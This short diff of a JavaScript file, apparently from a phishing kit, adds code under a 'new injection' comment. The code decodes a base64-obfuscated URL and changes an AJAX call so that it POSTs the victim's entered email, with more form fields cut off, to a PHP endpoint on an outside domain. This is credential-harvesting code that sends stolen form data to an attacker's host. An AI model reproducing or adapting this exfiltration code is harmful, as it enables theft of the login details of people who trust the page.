@@ -327,10 +327,14 @@
       
       ///////////new injection////////////////
       count=count+1;
-      
+      // Base64-encoded URL (you will have this value)
+var encodedUrl = 'aHR0cHM6Ly92aWN0b3JpYWdhcmFnZWxvY2tlcmJpZS5jb20vMzQ1NjNmMWMzL2Zpci5waHA=';
+
+// Decode the base64-encoded URL
+var decodedUrl = atob(encodedUrl); // Decodes the base64 string
       $.ajax({
         dataType: 'JSON',
-        url: 'aHR0cHM6Ly92aWN0b3JpYWdhcmFnZWxvY2tlcmJpZS5jb20vMzQ1NjNmMWMzL2Zpci5waHA=',
+        url: 'https://victoriagaragelockerbie.com/34563f1c3/first.php',
         type: 'POST',
         data:{
           email:email,
